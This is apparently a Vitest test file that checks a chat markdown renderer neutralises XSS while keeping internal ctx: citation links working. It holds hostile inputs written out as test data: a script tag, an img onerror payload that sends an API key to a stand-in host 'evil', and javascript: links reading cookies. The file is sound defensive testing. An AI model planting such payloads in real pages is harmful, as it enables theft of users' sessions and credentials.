// @vitest-environment jsdom
//
// XSS suite for the chat markdown pipeline (design 06 §5, C5). Block content is
// hostile input quoted by the model; renderMarkdown must neutralize it AND keep
// the ctx: citation links working through to /graph?focus=. The jsdom
// environment gives DOMPurify a window.
//
// The assertions inspect the rendered DOM, not the HTML string: an escaped
// "javascript:" sitting as TEXT in a code span is harmless (markdown-it renders
// an invalid link as plain text), so string-absence would be both wrong and
// brittle. What must be absent is an EXECUTABLE sink — a <script> element, an
// on* handler, an <a> whose href is a javascript: URL.

import { describe, expect, it } from 'vitest'
import { renderMarkdown } from './markdown'

function parse(html: string): HTMLElement {
  const div = document.createElement('div')
  div.innerHTML = html
  return div
}

function hasEventHandler(root: HTMLElement): boolean {
  return [...root.querySelectorAll('*')].some((el) =>
    [...el.attributes].some((a) => a.name.toLowerCase().startsWith('on')),
  )
}

describe('renderMarkdown — XSS neutralization', () => {
  it('emits no <script> element from a quoted block', () => {
    const out = renderMarkdown('Here is a block: <script>alert(1)</script> end')
    expect(parse(out).querySelector('script')).toBeNull()
  })

  it('strips on* event handlers (the <img onerror> exfil vector)', () => {
    const out = renderMarkdown('<img src=x onerror="fetch(`https://evil/?k=`+sessionStorage.ctx_api_key)">')
    expect(hasEventHandler(parse(out))).toBe(false)
  })

  it('emits no <a> with a javascript: href', () => {
    const out = renderMarkdown('[click me](javascript:alert(document.cookie))')
    const links = [...parse(out).querySelectorAll('a')]
    expect(links.every((a) => !(a.getAttribute('href') ?? '').toLowerCase().startsWith('javascript:'))).toBe(true)
  })

  it('neutralizes raw HTML embedded in the message (html:false escapes it)', () => {
    const out = renderMarkdown('The block said: <a href="javascript:steal()">x</a> and more')
    // html:false escapes the raw <a>, so it is text — no anchor element at all.
    expect(parse(out).querySelector('a')).toBeNull()
    expect(hasEventHandler(parse(out))).toBe(false)
  })
})

describe('renderMarkdown — ctx: citation survival', () => {
  it('rewrites a ctx:<id> citation to a /graph?focus= anchor', () => {
    const out = renderMarkdown('See [W49c verdict](ctx:019e789c-1381-7735-bd37-c3d0371b15d8) for details.')
    const a = parse(out).querySelector('a')
    expect(a).not.toBeNull()
    expect(a?.getAttribute('href')).toBe('/graph?focus=019e789c-1381-7735-bd37-c3d0371b15d8')
    expect(a?.textContent).toBe('W49c verdict')
  })

  it('renders ordinary markdown (bold, code, list) intact', () => {
    const root = parse(renderMarkdown('**bold** and `code` and a list:\n- one\n- two'))
    expect(root.querySelector('strong')?.textContent).toBe('bold')
    expect(root.querySelector('code')?.textContent).toBe('code')
    expect([...root.querySelectorAll('li')].map((li) => li.textContent)).toEqual(['one', 'two'])
  })

  it('returns an empty string for empty / non-string input', () => {
    expect(renderMarkdown('')).toBe('')
    // @ts-expect-error — defensive: the runtime guards a non-string
    expect(renderMarkdown(null)).toBe('')
  })
})
